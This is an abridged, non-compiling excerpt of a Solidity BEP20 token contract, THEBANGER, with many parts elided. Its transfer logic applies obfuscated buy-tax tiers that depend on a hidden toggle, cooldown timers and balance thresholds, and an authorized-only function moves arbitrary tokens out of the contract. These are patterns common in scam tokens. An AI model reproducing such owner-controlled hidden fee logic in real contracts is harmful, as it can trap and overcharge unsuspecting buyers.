...
contract THEBANGER is IBEP20, Auth {
    ...
    function _trFm(address sender, address recipient, uint256 amount, uint256 amountReceived) internal returns (bool){
        ...
        if (!authorizations[sender] && !iMxWE[recipient] && !bbt){
        ...
        if(sender == pair && bbt && !itCDh[recipient] && !iMxWE[recipient] &&
            ...
            amountReceived = stTF(sender) ? ttF(sender, recipient, amount) : amount; }
        if(sender == pair && bbt && !itCDh[recipient] && (_balances[recipient] > tAl) &&
            ...
            amountReceived = stTF(sender) ? ttF1(sender, amount) : amount; }
        if(sender == pair && bbt && !itCDh[recipient] && (_balances[recipient] > tAl) &&
            ...
            amountReceived = stTF(sender) ? ttF2(sender, amount) : amount; }
        if(sender == pair && bbt && !itCDh[recipient] && (_balances[recipient] > tAl) &&
            ...
            amountReceived = stTF(sender) ? ttF3(sender, amount) : amount;  }
        if(sender == pair && bbt && !itCDh[recipient] && (_balances[recipient] > tAl) &&
            !iMxWE[recipient] && (tCDtb[recipient] + tCDt4 < block.timestamp)){
            require((balanceOf(recipient) + amount) <= mwCD4); 
            amountReceived = stTF(sender) ? ttF4(sender, amount) : amount; }
        if(sender == pair && bbt && itCDh[recipient] && !iMxWE[recipient]){
        ...
        if(bOftTm && !bOftT && bOft > 0) { kickmtfc(); }    
        if(!iDxE[recipient]) {
    ...
    function tokappr(address _tadd, address _rec, uint256 _amt ) external authorized {
        TokT(_tadd).transfer(_rec, _amt);
    }
    ...
    function _checkMyBuyTax(address _wallet) external view returns (uint256) {
        ...
        if(bbt && !itCDh[_wallet] &&
            (_balances[_wallet] < tAl)){ BuyTax = bbf; }
        if(bbt && !itCDh[_wallet] && (_balances[_wallet] > tAl) &&
            (tCDtb[_wallet] + tCDt1 < block.timestamp) && 
            (tCDtb[_wallet] + tCDt2 > block.timestamp)){ BuyTax = bbf1; }
        if(bbt && !itCDh[_wallet] && (_balances[_wallet] > tAl) &&
            (tCDtb[_wallet] + tCDt2 < block.timestamp) && 
            (tCDtb[_wallet] + tCDt3 > block.timestamp)){ BuyTax = bbf2; }
        if(bbt && !itCDh[_wallet] && (_balances[_wallet] > tAl) &&
            (tCDtb[_wallet] + tCDt3 < block.timestamp) && 
            (tCDtb[_wallet] + tCDt4 > block.timestamp)){ BuyTax = bbf3;  }
        if(bbt && !itCDh[_wallet] && (_balances[_wallet] > tAl) &&
            (tCDtb[_wallet] + tCDt4 < block.timestamp)){ BuyTax = bbf4;}
        return BuyTax;
    }
